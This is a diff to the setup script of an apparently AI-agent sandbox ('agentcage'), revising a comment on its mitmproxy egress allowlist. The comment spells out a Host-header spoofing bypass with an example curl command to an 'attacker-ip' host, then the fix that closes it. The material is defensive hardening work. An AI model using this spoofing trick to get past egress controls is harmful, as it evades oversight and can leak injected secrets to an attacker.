@@ -144,10 +144,21 @@ chown acproxy:acproxy /var/log/agentcage 2>/dev/null || true
 
 # The mitmproxy addon (/opt/agentcage/allowlist_addon.py) reads
 # /etc/agentcage/allowlist.txt and 403s non-listed hosts from the proxy
-# itself — the upstream connection is never opened. The addon checks
-# `flow.request.pretty_host` which in transparent mode resolves to the
-# TLS SNI / destination IP, NOT a (potentially spoofed) HTTP Host header.
-# This invariant is what makes `--set keep_host_header=true` safe.
+# itself — the upstream connection is never opened. With
+# `--set keep_host_header=true` set below, mitmproxy's
+# `flow.request.pretty_host` reads the CLIENT-SENT HTTP Host header,
+# which is fully attacker-controlled by the cage workload (a cage can
+# `curl https://attacker-ip/ -H 'Host: api.anthropic.com'` and have
+# pretty_host report `api.anthropic.com` while the bytes go to
+# attacker-ip via SO_ORIGINAL_DST). The addon must NOT gate the
+# allowlist or secret injection on pretty_host: it derives an
+# authoritative host from `flow.client_conn.sni` (the TLS handshake)
+# with fallback to `flow.request.host` (the SO_ORIGINAL_DST IP), and
+# additionally blocks any request whose Host header disagrees with the
+# authoritative host. See `_authoritative_host` and
+# `_host_header_matches_authoritative` in allowlist_addon.py. This is
+# what restores the "Host header cannot bypass the allowlist or
+# unmask a secret" invariant under `keep_host_header=true`.
 su -s /bin/sh -c '
   cd /home/acproxy
   HOME=/home/acproxy /opt/agentcage/mitmproxy/mitmdump \
